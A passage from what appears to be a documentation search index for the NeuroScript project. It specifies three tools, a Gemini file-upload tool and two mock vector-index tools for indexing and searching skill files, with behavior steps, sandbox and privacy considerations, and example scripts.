NeuroScript sandbox environment that needs to be uploaded. Subject to <code>SecureFilePath</code> validation.</li> <li><code>display_name</code> (String): Optional. A user-friendly name to assign to the file within the API. If omitted or null, defaults to the relative path of the file from the sandbox root (if a sandbox is set) or the file's base name otherwise.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>On success: A map containing the details of the successfully uploaded and activated file. The structure matches the maps returned by <code>TOOL.ListAPIFiles</code>, including keys like <code>name</code>, <code>displayName</code>, <code>uri</code>, <code>mimeType</code>, <code>sizeBytes</code>, <code>state</code> (which will be \"ACTIVE\"), etc.</li> <li>On failure: An error (e.g., local file not found, upload API error, timeout waiting for ACTIVE state, security violation). A Go-level error will also be returned to the interpreter.</li> </ul> </li> <li>Behavior:<ol> <li>Checks if the internal GenAI client is initialized. Returns an error if not.</li> <li>Validates the <code>local_path</code> argument (must be a non-empty string) and performs <code>SecureFilePath</code> check against the interpreter's sandbox directory.</li> <li>Determines the <code>displayName</code> to use (provided argument or default based on path).</li> <li>Checks if the local file exists and gets its size. Handles zero-byte files by uploading minimal placeholder content (\" \").</li> <li>Determines the MIME type based on the file extension, defaulting to <code>application/octet-stream</code>.</li> <li>Calls the Gemini File API's <code>UploadFile</code> endpoint with the file content and determined options.</li> <li>Polls the API using <code>GetFile</code> until the uploaded file's state becomes <code>ACTIVE</code>.</li> <li>If the file becomes <code>ACTIVE</code> within the timeout period, returns a map containing the final file metadata.</li> <li>If the file fails to become <code>ACTIVE</code> (e.g., enters a <code>FAILED</code> state or times out), attempts to delete the failed upload from the API and returns an error.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> with permission to upload files.</li> <li><code>local_path</code> is validated using <code>SecureFilePath</code> to ensure it's within the allowed sandbox directory.</li> <li>Network access to Google Cloud services is required.</li> <li>The content of the uploaded file is transferred to Google Cloud storage.</li> </ul> </li> <li>Examples: <pre><code>// Upload a file using default display name\nresult1 := TOOL.UploadFile(\"data/input.txt\")\nIF result1[\"error\"] != null THEN\n    IO.Print(\"Error uploading input.txt:\", result1[\"error\"])\nELSE\n    IO.Print(\"Uploaded input.txt successfully. API Name:\", result1[\"name\"])\n    // Can now potentially use result1[\"uri\"] in prompts\nEND\n\n// Upload a file with a specific display name\nresult2 := TOOL.UploadFile(\"images/logo.png\", \"ProjectLogo\")\nIF result2[\"error\"] != null THEN\n    IO.Print(\"Error uploading logo.png:\", result2[\"error\"])\nELSE\n    IO.Print(\"Uploaded logo.png successfully. API Name:\", result2[\"name\"], \", URI:\", result2[\"uri\"])\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolUploadFile</code>.</li> <li>Uses <code>interpreter.GenAIClient().UploadFile()</code> and <code>interpreter.GenAIClient().GetFile()</code>.</li> <li>Logic adapted from <code>cmd/gensync/helpers.go</code>.</li> <li>Requires careful handling of file reading, zero-byte files, MIME types, and polling logic.</li> <li>Registered via <code>registerFileAPITools</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/vector_searchskills/","title":"vector_searchskills","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-vector-searchskills-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_vector.go, docs/script_spec.md :: relatedTo: Vector.VectorUpdate :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/vector_searchskills/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/vector_searchskills/#tool-specification-vectorsearchskills-v01","title":"Tool Specification: <code>Vector.SearchSkills</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Vector.SearchSkills</code> (v0.1)</li> <li>Purpose: Performs a similarity search against a (mock) vector index of indexed skill files. It takes a natural language query, generates an embedding for it, compares it to stored embeddings, and returns a ranked list of matching skill files based on cosine similarity.</li> <li>NeuroScript Syntax: <code>CALL Vector.SearchSkills(query: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>query</code> (String): Required. The natural language text query used to find relevant skills.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A JSON-formatted string representing a list of matching skills. (Accessible via <code>LAST</code> after the <code>CALL</code>).<ul> <li>Each item in the list is an object (Map) with two keys:<ul> <li><code>path</code> (String): The relative path (within the sandbox) of the skill file that matched.</li> <li><code>score</code> (Number): The cosine similarity score between the query and the skill file (typically between 0.0 and 1.0, higher means more similar).</li> </ul> </li> <li>The list is sorted in descending order by <code>score</code>.</li> <li>Returns an empty JSON list (<code>\"[]\"</code>) if no skills meet the similarity threshold (currently 0.5 in the implementation).</li> </ul> </li> <li>On failure (e.g., error generating query embedding): Returns an error message string (e.g., \"SearchSkills embedding generation failed: ...\"). Internal errors (like JSON marshalling) might cause a script execution error. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>query</code>) of type String is provided.</li> <li>Initializes the interpreter's internal <code>vectorIndex</code> (a map of absolute file paths to embeddings) if it's not already initialized.</li> <li>Calls the interpreter's <code>GenerateEmbedding</code> function to get a vector embedding for the input <code>query</code>. If this fails, returns an error message string.</li> <li>Iterates through each entry (absolute path -&gt; stored embedding) in the <code>vectorIndex</code>.</li> <li>Calculates the cosine similarity score between the query embedding and the stored embedding. Skips the entry if calculation fails.</li> <li>If the calculated score meets or exceeds a predefined threshold (0.5), it proceeds.</li> <li>Converts the absolute path (from the index key) back to a relative path based on the interpreter's <code>sandboxDir</code>.</li> <li>Creates a result Map: <code>{\"path\": relative_path, \"score\": score}</code>.</li> <li>Appends this Map to a list of results.</li> <li>After checking all entries, sorts the list of result Maps in descending order based on the <code>score</code>.</li> <li>Marshals the sorted list into a JSON string. If marshalling fails, an internal error occurs.</li> <li>Returns the JSON string representing the sorted list of results.</li> </ol> </li> <li>Security Considerations:<ul> <li>Relies on <code>interpreter.GenerateEmbedding</code>, which typically involves sending the query text to an external service (like an LLM API). Consider the privacy implications of the query content being sent externally.</li> <li>The tool itself reads from an in-memory index (<code>interpreter.vectorIndex</code>) and does not directly perform file I/O during the search operation.</li> <li>The conversion from absolute paths (stored in the index) back to relative paths depends on the correct configuration of the interpreter's <code>sandboxDir</code>.</li> </ul> </li> <li>Examples: <pre><code># Prerequisite: Assume VectorUpdate has been called previously for some files\n# CALL Vector.VectorUpdate(\"library/math_helpers.ns.txt\")\n# CALL Vector.VectorUpdate(\"library/string_utils.ns.txt\")\n\n# Example 1: Search for math-related skills\nSET search_query = \"How do I add two numbers?\"\nCALL Vector.SearchSkills(search_query)\nSET search_results_json = LAST\n\nEMIT \"Search Results for '\" + search_query + \"':\"\nEMIT search_results_json\n# Example Output (JSON string): \"[{\\\"path\\\":\\\"library/math_helpers.ns.txt\\\",\\\"score\\\":0.82}]\"\n# Note: Actual score and results depend heavily on the embedding model and indexed content.\n\n# Example 2: Search for something unlikely to match\nCALL Vector.SearchSkills(\"Tell me about ancient history\")\nSET no_match_json = LAST\nEMIT \"Search results for unlikely query: \" + no_match_json # Expect \"[]\"\n\n# Example 3: (Illustrative) Process results if JSON parsing were available\n# SET results_list = JSON.Parse(search_results_json) # Assumes JSON.Parse tool\n# IF List.Length(results_list) &gt; 0 THEN\n#   SET top_result = results_list[0]\n#   EMIT \"Top result path: \" + top_result[\"path\"] + \" with score: \" + top_result[\"score\"]\n# ELSE\n#   EMIT \"No relevant skills found.\"\n# ENDBLOCK\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_vector.go</code></li> <li>Function: <code>toolSearchSkills</code></li> <li>Spec Name: <code>SearchSkills</code></li> <li>Key Go Packages: <code>encoding/json</code>, <code>fmt</code>, <code>path/filepath</code>, <code>sort</code></li> <li>Relies heavily on <code>interpreter.GenerateEmbedding</code> (external call likely) and <code>interpreter.vectorIndex</code> (internal state). Also uses an internal <code>cosineSimilarity</code> helper.</li> <li>Registration: Registered by <code>registerVectorTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/vector_update/","title":"vector_update","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-vector-vectorupdate-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_vector.go, docs/script_spec.md :: relatedTo: Vector.SearchSkills :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/vector_update/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/vector_update/#tool-specification-vectorvectorupdate-v01","title":"Tool Specification: <code>Vector.VectorUpdate</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Vector.VectorUpdate</code> (v0.1)</li> <li>Purpose: Reads the content of a specified file (presumably a skill file) within the sandbox, generates a vector embedding for that content, and then adds or updates this embedding in the interpreter's internal (mock) vector index. This makes the file discoverable via <code>Vector.SearchSkills</code>.</li> <li>NeuroScript Syntax: <code>CALL Vector.VectorUpdate(filepath: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path (within the sandbox) of the file whose content should be indexed.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: Returns the literal string <code>\"OK\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error (e.g., path validation fails, file read error, embedding generation fails): Returns an error message string describing the failure. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>filepath</code>) of type String is provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. If validation fails, returns an error message string.</li> <li>Reads the entire content of the file at the validated absolute path using <code>os.ReadFile</code>. If reading fails, returns an error message string.</li> <li>Calls the interpreter's <code>GenerateEmbedding</code> function to get a vector embedding for the file's content string. If this fails, returns an error message string.</li> <li>Initializes the interpreter's internal <code>vectorIndex</code> (a map of absolute file paths to embeddings) if it's not already initialized.</li> <li>Stores the generated embedding in the <code>vectorIndex</code> map, using the absolute path of the file as the key. If an entry for this absolute path already exists, it is overwritten with the new embedding.</li> <li>Returns the string <code>\"OK\"</code> to indicate successful indexing/updating.</li> </ol> </li> <li>Security Considerations:<ul> <li>Uses <code>SecureFilePath</code> to ensure the file being read and indexed is within the sandbox.</li> <li>Relies on <code>interpreter.GenerateEmbedding</code>, which typically involves sending the entire file content to an external service (like an LLM API). This has significant privacy implications depending on the file content and the embedding service used. Ensure the embedding provider's privacy policy is acceptable.</li> <li>Modifies the interpreter's internal state (<code>vectorIndex</code>).</li> </ul> </li> <li>Examples: <pre><code># Example 1: Index a newly created skill file\nSET skill_content = \"\"\"\nDEFINE PROCEDURE CalculateArea(width, height)\nCOMMENT:\n    PURPOSE: Calculates the area of a rectangle.\n    INPUTS: - width: number\n            - height: number\n    OUTPUT: number (the calculated area)\n    ALGORITHM: Multiply width by height.\nENDCOMMENT\n# SET area = width * height # Requires Math tool\n# RETURN area\nRETURN \"Calculation placeholder\" # Placeholder\nEND\n\"\"\"\nCALL FS.WriteFile(\"library/geometry/area.ns.txt\", skill_content)\nSET write_status = LAST\n\nIF write_status == \"OK\" THEN\n  EMIT \"Indexing skill file: library/geometry/area.ns.txt\"\n  CALL Vector.VectorUpdate(\"library/geometry/area.ns.txt\")\n  SET index_status = LAST\n  EMIT \"Indexing status: \" + index_status # Expect \"OK\"\nELSE\n  EMIT \"Failed to write skill file, cannot index.\"\nENDBLOCK\n\n# Example 2: Attempt to index a non-existent file\nCALL Vector.VectorUpdate(\"non_existent_skill.ns.txt\")\nSET non_exist_status = LAST\nIF non_exist_status != \"OK\" THEN\n  EMIT \"Indexing failed for non-existent file as expected: \" + non_exist_status\nELSE\n  EMIT \"Indexing unexpectedly succeeded for non-existent file.\"\nENDBLOCK\n\n# Example 3: Search after indexing (using example from SearchSkills)\nCALL Vector.SearchSkills(\"calculate rectangle area\")\nSET search_results_json = LAST\nEMIT \"Search results after indexing: \" + search_results_json\n# Should hopefully now include 'library/geometry/area.ns.txt' if embedding works well\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_vector.go</code></li> <li>Function: <code>toolVectorUpdate</code></li> <li>Spec Name: <code>VectorUpdate</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>path/filepath</code></li> <li>Relies heavily on <code>interpreter.GenerateEmbedding</code> (external call likely) and modifies <code>interpreter.vectorIndex</code> (internal state). Uses <code>core.SecureFilePath</code>.</li> <li>Registration: Registered by <code>registerVectorTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"}]}